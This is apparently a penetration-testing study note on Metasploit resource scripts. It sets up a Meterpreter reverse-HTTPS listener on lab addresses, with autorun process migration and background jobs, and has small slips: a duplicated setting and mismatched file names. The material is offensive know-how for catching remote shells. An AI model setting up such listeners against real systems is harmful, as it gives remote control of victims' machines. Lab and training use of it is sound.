#exploit #metasploit 

### Resource Script

```ruby
use exploit/multi/handler
set PAYLOAD windows/meterpreter_reverse_https
set LHOST 192.168.119.4
set LPORT 443
```

Create a file with this content and name is resource.rc


#### Autorun Scripts

This will execute a module after a session is created 

**set AutoRunScript post/windows/manage/migrate** will create a notepad and migrate the process to that

**set ExitOnSession false** will ensure that session will accept incoming connections

```ruby
use exploit/multi/handler
set PAYLOAD windows/meterpreter_reverse_https
set LHOST 192.168.45.241
set LPORT 443
set ExitOnSession false
set ExitOnSession false
run -z -j
```

 _-z_ and _-j_ to run it as a job in the background and to stop us from automatically interacting with the session

```bash
sudo msfconsole -r listener.rc
```

